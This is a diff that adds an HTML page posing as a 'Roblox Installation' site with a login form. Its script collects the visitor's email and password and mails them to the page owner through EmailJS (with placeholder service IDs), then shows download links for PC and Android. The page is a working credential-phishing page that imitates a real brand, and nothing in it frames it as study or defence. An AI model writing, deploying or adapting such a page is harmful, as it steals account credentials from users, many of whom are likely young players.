@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+        header {
+            background-color: #ff4757;
+            color: white;
+            padding: 20px 0;
+        }
+        h1 {
+            margin: 0;
+        }
+        .gallery {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 20px;
+        }
+        .gallery img {
+            width: 300px;
+            height: auto;
+            margin: 10px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s;
+        }
+        .gallery img:hover {
+            transform: scale(1.05);
+        }
+        .login {
+            margin: 20px auto;
+            padding: 20px;
+            max-width: 400px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .login input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login button {
+            padding: 10px 20px;
+            background-color: #ff4757;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login button:hover {
+            background-color: #e04050;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Roblox Installation</h1>
+    </header>
+
+    <!-- Sign In Section -->
+    <section class="login" id="login-section">
+        <h2>Log In</h2>
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </section>
+
+    <!-- Gallery Section (Hidden initially) -->
+    <section class="gallery" id="gallery-section" style="display:none;">
+        <div class="container">
+            <h1>Click the Image Button in your platform</h1>
+            <!-- Image Buttons -->
+            <a href="file:///C:/Users/Ibrahim/Desktop/ahmad%20site/ahmadweb.html" target="_blank">
+                <img src="download.jpeg" alt="Roblox Logo" class="image-button">
+            </a>
+            <a href="pc.html" target="_blank">
+                <img src="download.png" alt="Roblox Logo" class="image-button">
+            </a>
+            <a href="android.html" target="_blank">
+                <img src="download (1).png" alt="Roblox Logo" class="image-button">
+            </a>
+        </div>
+    </section>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your user ID
+        emailjs.init("your_emailjs_user_id");  // Replace with your EmailJS user ID
+
+        // Check if the user is already logged in
+        if (localStorage.getItem('loggedIn') === 'true') {
+            // Show the gallery section and hide the login form if already logged in
+            document.getElementById('gallery-section').style.display = 'block';
+            document.getElementById('login-section').style.display = 'none';
+        } else {
+            // Show the login form if the user is not logged in
+            document.getElementById('gallery-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+        }
+
+        // Handle the login form submission
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();  // Prevent the default form submission
+
+            // Get the entered email and password
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send the login details (email and password) to your email using EmailJS
+            const templateParams = {
+                email: email,
+                password: password
+            };
+
+            emailjs.send('your_service_id', 'your_template_id', templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully:', response);
+
+                    // After sending the email, store the login status in localStorage
+                    localStorage.setItem('loggedIn', 'true');
+
+                    // Hide the login form and show the gallery section after successful login
+                    document.getElementById('gallery-section').style.display = 'block';
+                    document.getElementById('login-section').style.display = 'none';
+                }, function(error) {
+                    console.error('Error sending email:', error);
+                });
+        });
+    </script>
+</body>
+</html>
